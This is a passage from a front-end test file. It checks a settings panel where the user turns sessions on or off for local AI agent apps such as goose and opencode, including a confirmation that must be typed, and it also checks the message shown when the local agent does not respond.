    expect(row(container, "goose").querySelector('[data-sessions="off"]')).not.toBeNull();
    expect(row(container, "opencode").querySelector('[data-sessions="on"]')).not.toBeNull();
    expect(row(container, "codex").querySelector("[data-sessions]")).toBeNull();
    expect(row(container, "chatgpt").querySelector("[data-sessions]")).toBeNull();

    fireEvent.click(within(row(container, "goose")).getByText("Allow sessions here"));
    await waitFor(() => expect(row(container, "goose").textContent).toContain("acp: goose acp"));
    const yes = within(row(container, "goose")).getByText("Yes, turn it on") as HTMLButtonElement;
    expect(yes.disabled).toBe(true);
    fireEvent.change(row(container, "goose").querySelector("input")!, { target: { value: "goose" } });
    fireEvent.click(yes);
    await waitFor(() =>
      expect(ipc.calls).toContainEqual(["enableAppSessions", "goose", { review: true, typed: "goose" }]),
    );
    fireEvent.click(within(row(container, "opencode")).getByText("Turn sessions off"));
    await waitFor(() => expect(ipc.calls).toContainEqual(["disableAppSessions", "opencode"]));
  });

  it("without the local agent it says so", async () => {
    renderPanel({ initialTab: "ai" }, "en");
    expect(await screen.findByText(/local agent isn't answering/)).toBeTruthy();
  });
});
